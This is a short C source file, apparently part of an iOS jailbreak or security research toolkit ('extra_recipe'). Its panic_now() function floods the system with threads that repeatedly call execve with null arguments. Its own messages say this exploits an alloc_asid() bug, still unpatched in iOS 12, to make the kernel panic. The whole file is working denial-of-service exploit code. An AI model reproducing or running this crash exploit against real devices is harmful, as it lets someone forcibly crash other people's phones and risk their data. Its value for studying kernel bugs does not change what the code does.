//
//  reboot.c
//  extra_recipe
//
//  Created by Sem Voigtländer on 6/5/18.
//  Copyright © 2018 Ian Beer. All rights reserved.
//

#include "reboot.h"
#include <pthread.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

typedef struct alloc_asid_arg {
  int max_asid;
} alloc_asid_arg;

void *alloc_asid(void *arg) {
  for (int i = 0; i < (int)((alloc_asid_arg *)arg)->max_asid; i++) {
    syscall(SYS_execve, NULL, NULL, NULL);
  }
  return NULL;
}

void panic_now() {

  printf("Panicing the kernel using Sem Voigtländer's alloc_asid() bug which "
         "is still unpatched in iOS 12...\n");
  int max_asid = 65536 * 16;
  int max_attempts = 10000;
  alloc_asid_arg arg = {max_asid};
  for (int attempts = 0; attempts < max_attempts; attempts++) {
    pthread_t thread;
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_create(&thread, &attr, &alloc_asid, &arg);
  }
  printf("Shots are fired, the kernel should panic soon...\n");
}
